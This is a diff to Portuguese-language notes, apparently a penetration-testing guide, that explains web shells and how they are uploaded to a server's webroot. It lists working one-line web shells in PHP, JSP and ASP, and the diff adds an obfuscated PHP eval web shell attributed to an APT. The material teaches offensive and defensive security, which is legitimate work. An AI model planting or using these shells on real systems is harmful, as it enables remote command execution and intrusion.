@@ -65,6 +65,8 @@ A *Web Shell* normalmente é um script web, ou seja., PHP ou ASPX, que aceita no
 - php: `<?php system($_GET['ted']);?>`  e depois url&ted=whoami
 - jsp: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
 - asp: `<% eval request("cmd") %>`
+- web shell usada por uma APT `<?php class GI7Pl14V { public function __construct($H8Jy7){ @eval("/*Z#£¤h*u@!hJ2v689U02*/".$H8Jy7."/*Z#£¤h*u@!hJ2v689U02*/"); }}new GI7Pl14V($_REQUEST['pass']);?>`
+
 
 Uma vez que temos o nosso shell web, precisamos colocar o nosso script shell web no diretório web do host remoto (webroot) para executar o script através do navegador web.
 
